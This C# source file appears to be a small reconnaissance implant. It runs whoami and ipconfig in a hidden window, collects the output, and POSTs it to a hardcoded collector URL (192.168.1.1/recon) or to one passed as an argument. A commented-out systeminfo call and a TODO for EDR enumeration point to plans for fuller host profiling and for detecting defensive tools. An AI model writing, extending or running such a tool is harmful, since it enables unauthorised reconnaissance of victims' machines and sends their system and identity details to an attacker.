using System;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.IO;

class Program
{
	static string RunProcess(string filename, string arguments)
	{
		ProcessStartInfo ProcInfo = new ProcessStartInfo();
		ProcInfo.FileName = filename;
		ProcInfo.Arguments = arguments;
		ProcInfo.WindowStyle = ProcessWindowStyle.Hidden;
		ProcInfo.RedirectStandardOutput = true;
		ProcInfo.UseShellExecute = false;
		var proc = Process.Start(ProcInfo);
		String results = "Running: "+filename+" "+arguments+"\n";
		while (!proc.StandardOutput.EndOfStream)
		{
			string line = proc.StandardOutput.ReadLine();
			// do something with line
			results += line + "\n";
		}
		results += "-------------------------------------------------------------\n";
		return results;
	}

	static void Main(string[] args)
	{
		//First argument - URL to upload to
		string URL = "http://192.168.1.1/recon";
		if (args.Length > 0)
			URL = args[0];

		String results = "";
		// Basic Information
		//results += RunProcess("systeminfo.exe", "");
		results += RunProcess("whoami.exe", "");
		results += RunProcess("ipconfig.exe", "");
		//EDR enumeration
		// TODO
		Console.WriteLine(results);
		Console.ReadKey();

		//Upload results
		var request = WebRequest.Create(URL);
		var postData = "results=" + Uri.EscapeDataString(results);
		var data = Encoding.ASCII.GetBytes(postData);
		request.Method = "POST";
		request.ContentType = "application/x-www-form-urlencoded";
		request.ContentLength = data.Length;
				using (var stream = request.GetRequestStream())
		{
			stream.Write(data, 0, data.Length);
		}
		var response = (HttpWebResponse)request.GetResponse();
	}
}